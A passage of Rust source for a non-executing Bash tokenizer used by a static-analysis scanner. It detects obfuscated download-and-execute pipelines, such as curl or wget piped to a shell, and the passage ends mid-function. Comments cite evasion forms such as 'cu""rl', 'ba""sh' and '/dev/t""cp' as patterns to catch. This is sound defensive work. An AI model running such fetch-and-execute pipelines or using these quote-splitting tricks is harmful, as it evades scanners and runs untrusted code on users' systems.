//! Small, non-executing shell lexical helpers used by static analysis.
//!
//! This is intentionally not a shell evaluator. It only models enough Bash
//! tokenization to distinguish comments and quoted command-word fragments from
//! quoted data. In particular, adjacent fragments such as `cu""rl` are one
//! executable word, while the pipe in `echo "curl | bash"` remains data.

#[derive(Debug, Clone, PartialEq, Eq)]
struct ShellWord {
    value: String,
    obfuscated: bool,
    line: usize,
}

#[derive(Debug, Clone, PartialEq, Eq)]
enum Token {
    Word(ShellWord),
    Pipe,
    Separator,
    Redirection(Redirection),
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
struct Redirection {
    fd: u8,
    kind: RedirectionKind,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum RedirectionKind {
    Input,
    Output,
    HereString,
    Heredoc,
    BothOutput,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct DownloadExecute {
    pub downloader: String,
    pub executor: String,
    pub line: usize,
}

fn finish_word(
    tokens: &mut Vec<Token>,
    word: &mut String,
    obfuscated: &mut bool,
    word_line: usize,
) {
    if !word.is_empty() || *obfuscated {
        tokens.push(Token::Word(ShellWord {
            value: std::mem::take(word),
            obfuscated: std::mem::take(obfuscated),
            line: word_line,
        }));
    }
}

fn push_separator(tokens: &mut Vec<Token>) {
    if !matches!(tokens.last(), None | Some(Token::Separator)) {
        tokens.push(Token::Separator);
    }
}

fn redirection_fd(
    tokens: &mut Vec<Token>,
    word: &mut String,
    obfuscated: &mut bool,
    word_line: usize,
    default: u8,
) -> u8 {
    if !*obfuscated && !word.is_empty() && word.chars().all(|ch| ch.is_ascii_digit()) {
        let fd = word.parse().unwrap_or(default);
        word.clear();
        fd
    } else {
        finish_word(tokens, word, obfuscated, word_line);
        default
    }
}

/// Tokenize shell control operators and words without expanding anything.
fn tokenize(content: &str) -> Vec<Token> {
    let chars: Vec<char> = content.chars().collect();
    let mut tokens = Vec::new();
    let mut word = String::new();
    let mut obfuscated = false;
    let mut quote = None;
    let mut line = 1usize;
    let mut word_line = 1usize;
    let mut i = 0usize;

    while i < chars.len() {
        let ch = chars[i];

        if let Some(delimiter) = quote {
            if ch == delimiter {
                quote = None;
                obfuscated = true;
            } else if ch == '\\' && delimiter == '"' && i + 1 < chars.len() {
                let next = chars[i + 1];
                if next == '\n' {
                    line += 1;
                } else {
                    word.push(next);
                    obfuscated = true;
                }
                i += 1;
            } else {
                if ch == '\n' {
                    line += 1;
                }
                word.push(ch);
            }
            i += 1;
            continue;
        }

        match ch {
            '\'' | '"' => {
                if word.is_empty() {
                    word_line = line;
                }
                quote = Some(ch);
                obfuscated = true;
            }
            '\\' if i + 1 < chars.len() => {
                let next = chars[i + 1];
                if next == '\n' {
                    line += 1;
                } else {
                    if word.is_empty() {
                        word_line = line;
                    }
                    word.push(next);
                    obfuscated = true;
                }
                i += 1;
            }
            '#' if word.is_empty() => {
                while i + 1 < chars.len() && chars[i + 1] != '\n' {
                    i += 1;
                }
            }
            '&' if i + 1 < chars.len() && chars[i + 1] == '>' => {
                finish_word(&mut tokens, &mut word, &mut obfuscated, word_line);
                tokens.push(Token::Redirection(Redirection {
                    fd: 1,
                    kind: RedirectionKind::BothOutput,
                }));
                i += 1;
                if i + 1 < chars.len() && chars[i + 1] == '>' {
                    i += 1;
                }
            }
            '<' | '>' => {
                let output = ch == '>';
                let fd = redirection_fd(
                    &mut tokens,
                    &mut word,
                    &mut obfuscated,
                    word_line,
                    u8::from(output),
                );
                let kind =
                    if !output && i + 2 < chars.len() && chars[i + 1] == '<' && chars[i + 2] == '<'
                    {
                        i += 2;
                        RedirectionKind::HereString
                    } else if !output && i + 1 < chars.len() && chars[i + 1] == '<' {
                        i += 1;
                        if i + 1 < chars.len() && chars[i + 1] == '-' {
                            i += 1;
                        }
                        RedirectionKind::Heredoc
                    } else {
                        if i + 1 < chars.len() && matches!(chars[i + 1], '<' | '>' | '&' | '|') {
                            i += 1;
                        }
                        if output {
                            RedirectionKind::Output
                        } else {
                            RedirectionKind::Input
                        }
                    };
                tokens.push(Token::Redirection(Redirection { fd, kind }));
            }
            '|' => {
                finish_word(&mut tokens, &mut word, &mut obfuscated, word_line);
                if i + 1 < chars.len() && chars[i + 1] == '|' {
                    push_separator(&mut tokens);
                    i += 1;
                } else {
                    tokens.push(Token::Pipe);
                    if i + 1 < chars.len() && chars[i + 1] == '&' {
                        // `|&` pipes stderr as well as stdout.
                        i += 1;
                    }
                }
            }
            '&' if i + 1 < chars.len() && chars[i + 1] == '&' => {
                finish_word(&mut tokens, &mut word, &mut obfuscated, word_line);
                push_separator(&mut tokens);
                i += 1;
            }
            '&' => {
                finish_word(&mut tokens, &mut word, &mut obfuscated, word_line);
                push_separator(&mut tokens);
            }
            ';' => {
                finish_word(&mut tokens, &mut word, &mut obfuscated, word_line);
                push_separator(&mut tokens);
            }
            // Braces are grouping words only when they stand alone, so
            // `xargs -I{}`, `curl -d {}` and `${var}` stay ordinary words.
            '{' if word.is_empty()
                && chars
                    .get(i + 1)
                    .is_none_or(|next| next.is_whitespace() || *next == ';') =>
            {
                push_separator(&mut tokens);
            }
            '}' if word.is_empty() => {
                push_separator(&mut tokens);
            }
            '\n' => {
                finish_word(&mut tokens, &mut word, &mut obfuscated, word_line);
                line += 1;
                // A command may continue on the next line after a pipe.
                if !matches!(tokens.last(), Some(Token::Pipe)) {
                    push_separator(&mut tokens);
                }
            }
            c if c.is_whitespace() => {
                finish_word(&mut tokens, &mut word, &mut obfuscated, word_line);
            }
            _ => {
                if word.is_empty() {
                    word_line = line;
                }
                word.push(ch);
            }
        }

        i += 1;
    }

    finish_word(&mut tokens, &mut word, &mut obfuscated, word_line);
    tokens
}

fn is_assignment(word: &str) -> bool {
    let Some((name, _)) = word.split_once('=') else {
        return false;
    };
    !name.is_empty()
        && name.chars().enumerate().all(|(index, ch)| {
            ch == '_' || ch.is_ascii_alphanumeric() && (index > 0 || !ch.is_ascii_digit())
        })
}

#[derive(Debug, Clone)]
struct ParsedCommand {
    words: Vec<ShellWord>,
    stdin_overridden: bool,
    stdout_overridden: bool,
}

fn parse_command(tokens: &[Token]) -> ParsedCommand {
    let mut words = Vec::new();
    let mut skip_target = false;
    let mut stdin_overridden = false;
    let mut stdout_overridden = false;

    for token in tokens {
        match token {
            Token::Redirection(redirection) => {
                skip_target = true;
                if redirection.fd == 0
                    && matches!(
                        redirection.kind,
                        RedirectionKind::Input
                            | RedirectionKind::HereString
                            | RedirectionKind::Heredoc
                    )
                {
                    stdin_overridden = true;
                }
                if redirection.fd == 1
                    && matches!(
                        redirection.kind,
                        RedirectionKind::Output | RedirectionKind::BothOutput
                    )
                {
                    stdout_overridden = true;
                }
            }
            Token::Word(_) if skip_target => skip_target = false,
            Token::Word(word) => words.push(word.clone()),
            Token::Pipe | Token::Separator => {}
        }
    }

    ParsedCommand {
        words,
        stdin_overridden,
        stdout_overridden,
    }
}

#[derive(Debug, Clone)]
struct ResolvedCommand {
    executable: ShellWord,
    args: Vec<ShellWord>,
}

fn executable(tokens: &[Token]) -> Option<ResolvedCommand> {
    let parsed = parse_command(tokens);
    let words = expand_env_split(parsed.words)?;
    let mut i = 0;

    loop {
        while words.get(i).is_some_and(|word| is_assignment(&word.value)) {
            i += 1;
        }
        let word = words.get(i)?;
        let basename = command_name(word);
        let Some(kind) = wrapper_kind(basename) else {
            return Some(ResolvedCommand {
                executable: word.clone(),
                args: words[i + 1..].to_vec(),
            });
        };
        if matches!(kind, WrapperKind::Builtin) {
            return None;
        }
        i += 1;

        while let Some(option) = words.get(i) {
            if is_assignment(&option.value) {
                i += 1;
                continue;
            }
            if option.value == "--" {
                i += 1;
                break;
            }
            if !option.value.starts_with('-') {
                break;
            }
            match wrapper_option(kind, &option.value) {
                WrapperOption::Boolean | WrapperOption::InlineValue => i += 1,
                WrapperOption::Value if i + 1 < words.len() => i += 2,
                WrapperOption::NonExecuting | WrapperOption::Unknown | WrapperOption::Value => {
                    return None;
                }
            }
        }
        if matches!(kind, WrapperKind::Timeout) {
            // `timeout [OPTION] DURATION COMMAND`
            i += 1;
        }
    }
}

fn expand_env_split(mut words: Vec<ShellWord>) -> Option<Vec<ShellWord>> {
    let mut i = 0;
    while i < words.len() {
        if command_name(&words[i]) != "env" {
            i += 1;
            continue;
        }
        let mut option = i + 1;
        while option < words.len() {
            let (value, consumed, line) =
                if matches!(words[option].value.as_str(), "-S" | "--split-string") {
                    (words.get(option + 1)?.value.as_str(), 2, words[option].line)
                } else if let Some(value) = words[option].value.strip_prefix("--split-string=") {
                    (value, 1, words[option].line)
                } else {
                    if words[option].value == "--" || !words[option].value.starts_with('-') {
                        break;
                    }
                    option += 1;
                    continue;
                };
            let split = safe_split_string(value, line)?;
            words.splice(option..option + consumed, split);
            break;
        }
        i += 1;
    }
    Some(words)
}

fn safe_split_string(value: &str, line: usize) -> Option<Vec<ShellWord>> {
    if value.is_empty()
        || value.chars().any(|ch| {
            matches!(
                ch,
                '$' | '`' | '\\' | '\'' | '"' | ';' | '|' | '&' | '<' | '>' | '(' | ')' | '{' | '}'
            )
        })
    {
        return None;
    }
    let words: Vec<_> = value
        .split_whitespace()
        .map(|value| ShellWord {
            value: value.to_string(),
            obfuscated: false,
            line,
        })
        .collect();
    (!words.is_empty()).then_some(words)
}

#[derive(Debug, Clone, Copy)]
enum WrapperKind {
    Builtin,
    Command,
    Env,
    Exec,
    Nohup,
    Privilege,
    Time,
    Nice,
    Timeout,
    Setsid,
    Busybox,
    Stdbuf,
    Ionice,
}

fn wrapper_kind(word: &str) -> Option<WrapperKind> {
    match word {
        "builtin" => Some(WrapperKind::Builtin),
        "command" => Some(WrapperKind::Command),
        "env" => Some(WrapperKind::Env),
        "exec" => Some(WrapperKind::Exec),
        "nohup" => Some(WrapperKind::Nohup),
        "sudo" | "doas" => Some(WrapperKind::Privilege),
        "time" => Some(WrapperKind::Time),
        "nice" => Some(WrapperKind::Nice),
        "timeout" => Some(WrapperKind::Timeout),
        "setsid" => Some(WrapperKind::Setsid),
        "busybox" => Some(WrapperKind::Busybox),
        "stdbuf" => Some(WrapperKind::Stdbuf),
        "ionice" => Some(WrapperKind::Ionice),
        _ => None,
    }
}

#[derive(Debug, Clone, Copy)]
enum WrapperOption {
    Boolean,
    Value,
    InlineValue,
    NonExecuting,
    Unknown,
}

fn wrapper_option(kind: WrapperKind, option: &str) -> WrapperOption {
    match kind {
        WrapperKind::Builtin => WrapperOption::NonExecuting,
        WrapperKind::Command => match option {
            "-p" => WrapperOption::Boolean,
            "-v" | "-V" => WrapperOption::NonExecuting,
            _ => WrapperOption::Unknown,
        },
        WrapperKind::Env => match option {
            "-i" | "--ignore-environment" | "-0" | "--null" => WrapperOption::Boolean,
            "-u" | "--unset" | "-C" | "--chdir" => WrapperOption::Value,
            option
                if ["--unset=", "--chdir="]
                    .iter()
                    .any(|p| option.starts_with(p)) =>
            {
                WrapperOption::InlineValue
            }
            _ => WrapperOption::Unknown,
        },
        WrapperKind::Exec => match option {
            "-a" => WrapperOption::Value,
            "-c" | "-l" => WrapperOption::Boolean,
            _ => WrapperOption::Unknown,
        },
        WrapperKind::Nohup => WrapperOption::Unknown,
        WrapperKind::Privilege => match option {
            "-u" | "--user" | "-g" | "--group" | "-h" | "--host" | "-p" | "--prompt" | "-C"
            | "--close-from" | "-T" | "--command-timeout" | "-R" | "--chroot" | "-D"
            | "--chdir" => WrapperOption::Value,
            "-E" | "--preserve-env" | "-H" | "--set-home" | "-n" | "--non-interactive" | "-S"
            | "--stdin" | "-i" | "--login" | "-b" | "--background" => WrapperOption::Boolean,
            "-l" | "--list" | "-v" | "--validate" | "-V" | "--version" | "-e" | "--edit" => {
                WrapperOption::NonExecuting
            }
            option
                if [
                    "--user=",
                    "--group=",
                    "--host=",
                    "--prompt=",
                    "--close-from=",
                    "--command-timeout=",
                    "--chroot=",
                    "--chdir=",
                ]
                .iter()
                .any(|prefix| option.starts_with(prefix)) =>
            {
                WrapperOption::InlineValue
            }
            _ => WrapperOption::Unknown,
        },
        WrapperKind::Nice => match option {
            "-n" | "--adjustment" => WrapperOption::Value,
            option
                if option.starts_with("--adjustment=")
                    || option[1..]
                        .chars()
                        .all(|ch| ch.is_ascii_digit() || ch == '-') =>
            {
                WrapperOption::InlineValue
            }
            _ => WrapperOption::Unknown,
        },
        WrapperKind::Timeout => match option {
            "-s" | "--signal" | "-k" | "--kill-after" => WrapperOption::Value,
            "--preserve-status" | "--foreground" | "-v" | "--verbose" => WrapperOption::Boolean,
            option
                if option.starts_with("--signal=")
                    || option.starts_with("--kill-after=")
                    || option.starts_with("-s")
                    || option.starts_with("-k") =>
            {
                WrapperOption::InlineValue
            }
            _ => WrapperOption::Unknown,
        },
        WrapperKind::Setsid => match option {
            "-f" | "--fork" | "-w" | "--wait" | "-c" | "--ctty" => WrapperOption::Boolean,
            _ => WrapperOption::Unknown,
        },
        WrapperKind::Busybox => WrapperOption::Unknown,
        WrapperKind::Stdbuf => match option {
            "-i" | "-o" | "-e" => WrapperOption::Value,
            option
                if ["-i", "-o", "-e", "--input=", "--output=", "--error="]
                    .iter()
                    .any(|prefix| option.starts_with(prefix)) =>
            {
                WrapperOption::InlineValue
            }
            _ => WrapperOption::Unknown,
        },
        WrapperKind::Ionice => match option {
            "-c" | "--class" | "-n" | "--classdata" => WrapperOption::Value,
            "-t" | "--ignore" => WrapperOption::Boolean,
            option if option.starts_with("-c") || option.starts_with("-n") => {
                WrapperOption::InlineValue
            }
            _ => WrapperOption::Unknown,
        },
        WrapperKind::Time => match option {
            "-f" | "--format" | "-o" | "--output" => WrapperOption::Value,
            "-a" | "--append" | "-p" | "--portability" | "-v" | "--verbose" => {
                WrapperOption::Boolean
            }
            _ => WrapperOption::Unknown,
        },
    }
}

fn command_name(word: &ShellWord) -> &str {
    word.value.rsplit('/').next().unwrap_or(&word.value)
}

/// Return whether any active command matches one of the supplied command
/// markers. Quoted data, comments, inert heredocs, and arguments to unrelated
/// commands do not count. Literal shell strings and heredocs that feed an
/// interpreter are inspected recursively.
pub fn contains_executable_command(content: &str, commands: &[&str]) -> bool {
    contains_executable_command_inner(content, commands, 0)
}

fn contains_executable_command_inner(content: &str, commands: &[&str], depth: usize) -> bool {
    if depth > 6 {
        return false;
    }

    let (active_content, heredoc_bodies) = extract_heredoc_bodies(content);
    let tokens = tokenize(&active_content);
    for (start, end) in command_spans(&tokens) {
        let Some(command) = executable(&tokens[start..end]) else {
            continue;
        };
        if commands
            .iter()
            .any(|marker| command_matches_marker(&command, marker))
        {
            return true;
        }
        if let Some(script) = literal_shell_source(&command)
            && contains_executable_command_inner(&script, commands, depth + 1)
        {
            return true;
        }
    }

    heredoc_bodies
        .into_iter()
        .any(|body| contains_executable_command_inner(&body.content, commands, depth + 1))
}

fn command_matches_marker(command: &ResolvedCommand, marker: &str) -> bool {
    let marker_words: Vec<_> = marker.split_whitespace().collect();
    let Some((expected_command, expected_args)) = marker_words.split_first() else {
        return false;
    };
    if !command_name(&command.executable).eq_ignore_ascii_case(expected_command) {
        return false;
    }
    expected_args.len() <= command.args.len()
        && expected_args
            .iter()
            .zip(&command.args)
            .all(|(expected, actual)| actual.value.eq_ignore_ascii_case(expected))
}

/// Find a download-to-interpreter pipeline whose executable word used shell
/// quote/escape concatenation. Ordinary literal pipelines remain owned by the
/// pattern database, avoiding duplicate signals.
pub fn find_obfuscated_download_execute(content: &str) -> Option<DownloadExecute> {
    find_obfuscated_download_execute_inner(content, 0, 0)
}

fn find_obfuscated_download_execute_inner(
    content: &str,
    depth: usize,
    line_offset: usize,
) -> Option<DownloadExecute> {
    if depth > 6 {
        return None;
    }

    let (active_content, heredoc_bodies) = extract_heredoc_bodies(content);
    let tokens = tokenize(&active_content);

    for (pipe_index, token) in tokens.iter().enumerate() {
        if !matches!(token, Token::Pipe) {
            continue;
        }

        let left_start = tokens[..pipe_index]
            .iter()
            .rposition(|token| matches!(token, Token::Separator | Token::Pipe))
            .map_or(0, |index| index + 1);
        let right_end = tokens[pipe_index + 1..]
            .iter()
            .position(|token| matches!(token, Token::Separator | Token::Pipe))
            .map_or(tokens.len(), |index| pipe_index + 1 + index);

        let Some(left) = executable(&tokens[left_start..pipe_index]) else {
            continue;
        };
        let Some(right) = executable(&tokens[pipe_index + 1..right_end]) else {
            continue;
        };

        let left_parsed = parse_command(&tokens[left_start..pipe_index]);
        let right_parsed = parse_command(&tokens[pipe_index + 1..right_end]);
        if left_parsed.stdout_overridden
            || right_parsed.stdin_overridden
            || !interpreter_consumes_stdin(&right)
        {
            continue;
        }

        let downloader = command_name(&left.executable).to_ascii_lowercase();
        let executor = command_name(&right.executable).to_ascii_lowercase();
        let is_downloader = matches!(downloader.as_str(), "curl" | "wget");
        let is_executor = matches!(
            executor.as_str(),
            "bash"
                | "sh"
                | "python"
                | "python2"
                | "python3"
                | "perl"
                | "ruby"
                | "php"
                | "lua"
                | "node"
        );

        if is_downloader
            && is_executor
            && (left.executable.obfuscated || right.executable.obfuscated)
        {
            return Some(DownloadExecute {
                downloader,
                executor,
                line: line_offset + left.executable.line.min(right.executable.line),
            });
        }
    }

    for (start, end) in command_spans(&tokens) {
        let Some(command) = executable(&tokens[start..end]) else {
            continue;
        };
        let Some(script) = literal_shell_source(&command) else {
            continue;
        };
        if let Some(mut finding) =
            find_obfuscated_download_execute_inner(&script, depth + 1, line_offset)
        {
            finding.line = line_offset + command.executable.line;
            return Some(finding);
        }
    }

    for body in heredoc_bodies {
        if let Some(finding) = find_obfuscated_download_execute_inner(
            &body.content,
            depth + 1,
            line_offset + body.start_line.saturating_sub(1),
        ) {
            return Some(finding);
        }
    }

    None
}

fn command_spans(tokens: &[Token]) -> Vec<(usize, usize)> {
    let mut spans = Vec::new();
    let mut start = 0;
    for (index, token) in tokens.iter().enumerate() {
        if matches!(token, Token::Pipe | Token::Separator) {
            if start < index {
                spans.push((start, index));
            }
            start = index + 1;
        }
    }
    if start < tokens.len() {
        spans.push((start, tokens.len()));
    }
    spans
}

const SHELL_INTERPRETERS: &[&str] = &["bash", "sh", "dash", "ksh", "zsh", "mksh", "ash"];
const SCRIPT_INTERPRETERS: &[&str] = &[
    "python", "python2", "python3", "perl", "ruby", "php", "lua", "node",
];

/// Paths that name the process's own stdin.
const STDIN_PATHS: &[&str] = &["-", "/dev/stdin", "/dev/fd/0", "/proc/self/fd/0"];

/// Short-option grammar for one interpreter family.
struct InterpreterOptions {
    /// Flags whose presence means the program comes from an argument.
    inline: &'static str,
    /// Flags that take a value (attached, or the next word when not attached).
    value: &'static str,
    /// Flags that force reading the program from stdin (`sh -s`).
    stdin: &'static str,
}

fn interpreter_options(name: &str) -> Option<InterpreterOptions> {
    let options = |inline, value, stdin| InterpreterOptions {
        inline,
        value,
        stdin,
    };
    Some(match name {
        n if SHELL_INTERPRETERS.contains(&n) => options("c", "oO", "s"),
        "python" | "python2" | "python3" => options("cm", "WX", ""),
        "perl" => options("eE", "IMmlx0Ci", ""),
        "ruby" => options("e", "IEreCKFx", ""),
        "php" => options("rRBE", "cdzfFt", ""),
        "lua" => options("e", "lW", ""),
        "node" => options("ep", "r", ""),
        _ => return None,
    })
}

/// Whether the command reads its program from stdin. Each interpreter's
/// inline-code flags (`sh -c`, `python -c/-m`, `perl -e/-E`, `php -r`,
/// `node -e/-p`) take the program from an argument, and option values
/// (`bash -o pipefail`, `python -W ignore`, `ruby -E utf-8`) are skipped rather
/// than mistaken for a script operand. `sh -s`, no operand, or a stdin path
/// operand read the program from stdin; `source`/`.` only with a stdin path.
fn interpreter_consumes_stdin(command: &ResolvedCommand) -> bool {
    let name = command_name(&command.executable);
    if matches!(name, "source" | ".") {
        return command
            .args
            .first()
            .is_some_and(|operand| STDIN_PATHS.contains(&operand.value.as_str()));
    }
    let Some(options) = interpreter_options(name) else {
        return false;
    };
    let shell = SHELL_INTERPRETERS.contains(&name);

    let mut i = 0;
    while i < command.args.len() {
        let value = command.args[i].value.as_str();
        if value == "--" {
            return command
                .args
                .get(i + 1)
                .is_none_or(|operand| STDIN_PATHS.contains(&operand.value.as_str()));
        }
        if let Some(long) = value.strip_prefix("--") {
            if matches!(long, "command" | "eval" | "print") {
                return false;
            }
            if !long.contains('=')
                && matches!(
                    long,
                    "rcfile" | "init-file" | "require" | "import" | "loader"
                )
            {
                i += 1;
            }
            i += 1;
            continue;
        }
        let bundle = value
            .strip_prefix('-')
            .or_else(|| value.strip_prefix('+').filter(|_| shell));
        let Some(bundle) = bundle.filter(|bundle| !bundle.is_empty()) else {
            return STDIN_PATHS.contains(&value);
        };
        let mut skip_next = 0;
        for (offset, flag) in bundle.char_indices() {
            if options.inline.contains(flag) && value.starts_with('-') {
                return false;
            }
            if options.stdin.contains(flag) && value.starts_with('-') {
                return true;
            }
            if options.value.contains(flag) {
                if shell {
                    // Shells: each `o`/`O` in a bundle takes the next word.
                    skip_next += 1;
                    continue;
                }
                if bundle[offset + flag.len_utf8()..].is_empty() {
                    skip_next = 1;
                }
                break;
            }
        }
        i += 1 + skip_next;
    }
    true
}

fn literal_shell_source(command: &ResolvedCommand) -> Option<String> {
    let name = command_name(&command.executable);
    if name == "eval" {
        return literal_words(&command.args);
    }
    if !matches!(name, "bash" | "sh" | "dash" | "ksh" | "zsh") {
        return None;
    }

    for (index, argument) in command.args.iter().enumerate() {
        if argument.value == "-c"
            || argument.value == "--command"
            || argument.value.starts_with('-')
                && argument.value.trim_start_matches('-').contains('c')
        {
            return command
                .args
                .get(index + 1)
                .and_then(|script| literal_words(std::slice::from_ref(script)));
        }
        if !argument.value.starts_with('-') {
            return None;
        }
    }
    None
}

fn literal_words(words: &[ShellWord]) -> Option<String> {
    (!words.is_empty()
        && words
            .iter()
            .all(|word| !word.value.contains(['$', '`', '\n', '\r'])))
    .then(|| {
        words
            .iter()
            .map(|word| word.value.as_str())
            .collect::<Vec<_>>()
            .join(" ")
    })
}

struct HeredocBody {
    content: String,
    start_line: usize,
}

struct HeredocSpec {
    delimiter: String,
    strip_tabs: bool,
    /// Unquoted delimiter: the shell expands `$(...)` and backticks in the body.
    expands: bool,
}

struct PendingHeredoc {
    spec: HeredocSpec,
    execute: bool,
    content: String,
    start_line: usize,
}

fn extract_heredoc_bodies(content: &str) -> (String, Vec<HeredocBody>) {
    let (active, executed, _) = extract_heredoc_parts(content);
    (active, executed)
}

/// Active text, heredoc bodies fed to an interpreter, and the remaining
/// unquoted-delimiter bodies, whose command substitutions the shell still
/// executes while expanding them.
fn extract_heredoc_parts(content: &str) -> (String, Vec<HeredocBody>, Vec<HeredocBody>) {
    use std::collections::VecDeque;

    let mut active = String::with_capacity(content.len());
    let mut bodies = Vec::new();
    let mut expanding = Vec::new();
    let mut pending = VecDeque::<PendingHeredoc>::new();
    let mut line_number = 1;

    for line in content.split_inclusive('\n') {
        let physical = line.strip_suffix('\n').unwrap_or(line);
        if let Some(heredoc) = pending.front_mut() {
            let candidate = if heredoc.spec.strip_tabs {
                physical.trim_start_matches('\t')
            } else {
                physical
            };
            if candidate == heredoc.spec.delimiter {
                let finished = pending.pop_front().expect("front heredoc exists");
                let body = HeredocBody {
                    content: finished.content,
                    start_line: finished.start_line,
                };
                if finished.execute {
                    bodies.push(body);
                } else if finished.spec.expands {
                    expanding.push(body);
                }
            } else if heredoc.execute || heredoc.spec.expands {
                heredoc.content.push_str(candidate);
                heredoc.content.push('\n');
            }
            if line.ends_with('\n') {
                active.push('\n');
            }
            line_number += 1;
            continue;
        }

        active.push_str(line);
        let specs = find_heredoc_specs(physical);
        let flags = heredoc_execution_flags(physical);
        for (index, spec) in specs.into_iter().enumerate() {
            pending.push_back(PendingHeredoc {
                spec,
                execute: flags.get(index).copied().unwrap_or(false),
                content: String::new(),
                start_line: line_number + 1,
            });
        }
        line_number += 1;
    }

    (active, bodies, expanding)
}

fn heredoc_execution_flags(header: &str) -> Vec<bool> {
    let tokens = tokenize(header);
    let mut ordinals = vec![None; tokens.len()];
    let mut count = 0;
    for (index, token) in tokens.iter().enumerate() {
        if matches!(
            token,
            Token::Redirection(Redirection {
                kind: RedirectionKind::Heredoc,
                ..
            })
        ) {
            ordinals[index] = Some(count);
            count += 1;
        }
    }
    let mut flags = vec![false; count];

    for (start, end) in command_spans(&tokens) {
        let last_input = tokens[start..end]
            .iter()
            .enumerate()
            .rev()
            .find(|(_, token)| {
                matches!(
                    token,
                    Token::Redirection(Redirection {
                        fd: 0,
                        kind: RedirectionKind::Input
                            | RedirectionKind::HereString
                            | RedirectionKind::Heredoc,
                    })
                )
            })
            .map(|(offset, _)| start + offset);
        let Some(redirection_index) = last_input else {
            continue;
        };
        let Some(ordinal) = ordinals[redirection_index] else {
            continue;
        };

        let Some(source) = executable(&tokens[start..end]) else {
            continue;
        };
        let direct_interpreter = interpreter_consumes_stdin(&source);
        let cat_to_interpreter = command_name(&source.executable) == "cat"
            && cat_reads_stdin(&source)
            && matches!(tokens.get(end), Some(Token::Pipe))
            && command_spans(&tokens)
                .into_iter()
                .find(|(next_start, _)| *next_start == end + 1)
                .is_some_and(|(next_start, next_end)| {
                    let parsed = parse_command(&tokens[next_start..next_end]);
                    !parsed.stdin_overridden
                        && executable(&tokens[next_start..next_end])
                            .is_some_and(|sink| interpreter_consumes_stdin(&sink))
                });
        flags[ordinal] = direct_interpreter || cat_to_interpreter;
    }

    flags
}

fn cat_reads_stdin(command: &ResolvedCommand) -> bool {
    command
        .args
        .iter()
        .all(|argument| argument.value.starts_with('-') || argument.value == "-")
}

fn find_heredoc_specs(line: &str) -> Vec<HeredocSpec> {
    let chars: Vec<char> = line.chars().collect();
    let mut specs = Vec::new();
    let mut quote = None;
    let mut escaped = false;
    let mut arithmetic_depth = 0usize;
    let mut i = 0;

    while i < chars.len() {
        let ch = chars[i];
        if escaped {
            escaped = false;
            i += 1;
            continue;
        }
        if let Some(delimiter) = quote {
            if ch == '\\' && delimiter == '"' {
                escaped = true;
            } else if ch == delimiter {
                quote = None;
            }
            i += 1;
            continue;
        }
        if arithmetic_depth > 0 {
            match ch {
                '(' => arithmetic_depth += 1,
                ')' => arithmetic_depth = arithmetic_depth.saturating_sub(1),
                _ => {}
            }
            i += 1;
            continue;
        }
        if ch == '$' && chars.get(i + 1) == Some(&'(') && chars.get(i + 2) == Some(&'(') {
            arithmetic_depth = 2;
            i += 3;
            continue;
        }
        if ch == '(' && chars.get(i + 1) == Some(&'(') {
            arithmetic_depth = 2;
            i += 2;
            continue;
        }
        match ch {
            '\\' => escaped = true,
            '\'' | '"' => quote = Some(ch),
            '#' if i == 0 || chars[i - 1].is_whitespace() => break,
            '<' if chars.get(i + 1) == Some(&'<') && chars.get(i + 2) != Some(&'<') => {
                i += 2;
                let strip_tabs = chars.get(i) == Some(&'-');
                if strip_tabs {
                    i += 1;
                }
                while chars.get(i).is_some_and(|ch| ch.is_whitespace()) {
                    i += 1;
                }
                let (delimiter, next, quoted) = parse_heredoc_delimiter(&chars, i);
                if !delimiter.is_empty() {
                    specs.push(HeredocSpec {
                        delimiter,
                        strip_tabs,
                        expands: !quoted,
                    });
                }
                i = next;
                continue;
            }
            _ => {}
        }
        i += 1;
    }
    specs
}

fn parse_heredoc_delimiter(chars: &[char], mut i: usize) -> (String, usize, bool) {
    let mut word = String::new();
    let mut quote = None;
    let mut quoted = false;
    while i < chars.len() {
        let ch = chars[i];
        if let Some(delimiter) = quote {
            if ch == delimiter {
                quote = None;
            } else if ch == '\\' && delimiter == '"' && i + 1 < chars.len() {
                i += 1;
                word.push(chars[i]);
            } else {
                word.push(ch);
            }
            i += 1;
            continue;
        }
        match ch {
            '\'' | '"' => {
                quote = Some(ch);
                quoted = true;
            }
            '\\' if i + 1 < chars.len() => {
                i += 1;
                word.push(chars[i]);
                quoted = true;
            }
            ch if ch.is_whitespace() || ";&|<>".contains(ch) => break,
            _ => word.push(ch),
        }
        i += 1;
    }
    (word, i, quoted)
}

/// Remove Bash comments while preserving line numbering and quoted `#` data.
/// A `#` begins a comment only at the beginning of a shell word.
pub fn strip_comments(content: &str) -> String {
    let mut output = String::with_capacity(content.len());
    let mut quote = None;
    let mut escaped = false;
    let mut at_word_start = true;

    for line in content.split_inclusive('\n') {
        let mut comment_at = None;

        for (index, ch) in line.char_indices() {
            if escaped {
                escaped = false;
                at_word_start = false;
                continue;
            }

            if let Some(delimiter) = quote {
                if ch == delimiter {
                    quote = None;
                } else if ch == '\\' && delimiter == '"' {
                    escaped = true;
                }
                continue;
            }

            match ch {
                '\\' => {
                    escaped = true;
                    at_word_start = false;
                }
                '\'' | '"' => {
                    quote = Some(ch);
                    at_word_start = false;
                }
                '#' if at_word_start => {
                    comment_at = Some(index);
                    break;
                }
                c if c.is_whitespace() => at_word_start = true,
                ';' | '|' | '&' | '(' | ')' => at_word_start = true,
                _ => at_word_start = false,
            }
        }

        if let Some(index) = comment_at {
            output.push_str(&line[..index]);
            if line.ends_with('\n') {
                output.push('\n');
            }
            escaped = false;
            at_word_start = true;
        } else {
            output.push_str(line);
        }
    }

    output
}

/// Join quote and escape fragments that cannot hold prose, so `ba""sh`,
/// `/dev/t""cp`, `n''c` and `c\url` read as the words the shell executes.
///
/// A quoted segment loses its delimiters only when its content has no
/// whitespace and no shell operators, so a quoted sentence such as
/// `echo "run curl | sh"` is left exactly as written. Line count is preserved
/// so pattern findings still point at the original source line. This is a
/// supplementary view for the literal pattern database, never a replacement
/// for the raw text.
pub fn join_quoted_fragments(content: &str) -> String {
    let chars: Vec<char> = content.chars().collect();
    let mut output = String::with_capacity(content.len());
    let mut i = 0usize;

    while i < chars.len() {
        let ch = chars[i];
        match ch {
            '\\' if i + 1 < chars.len()
                && (chars[i + 1].is_ascii_alphanumeric() || chars[i + 1] == '/') =>
            {
                output.push(chars[i + 1]);
                i += 2;
            }
